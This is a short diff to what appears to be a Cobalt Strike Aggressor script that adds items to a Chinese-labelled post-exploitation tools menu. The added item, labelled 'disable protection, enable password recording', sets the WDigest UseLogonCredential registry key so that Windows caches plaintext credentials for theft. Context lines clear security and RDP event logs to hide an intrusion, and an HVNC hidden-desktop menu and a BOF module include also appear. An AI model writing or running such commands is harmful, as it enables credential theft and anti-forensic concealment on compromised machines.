@@ -144,6 +144,10 @@ menu "小工具"{
         bshell($bid, "wevtutil cl security");
         bshell($bid, "wevtutil cl Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational");
     }
+    item "关闭保护开启密码记录"{
+        $bid = $1;
+        bshell($bid, "reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1");
+    }
     
     menu "HVNC" {
        item "安装"{
@@ -170,4 +174,6 @@ menu "小工具"{
        }
        
     }
+    include(script_resource("modules/BOFRunPortable.cna"));
 }
+
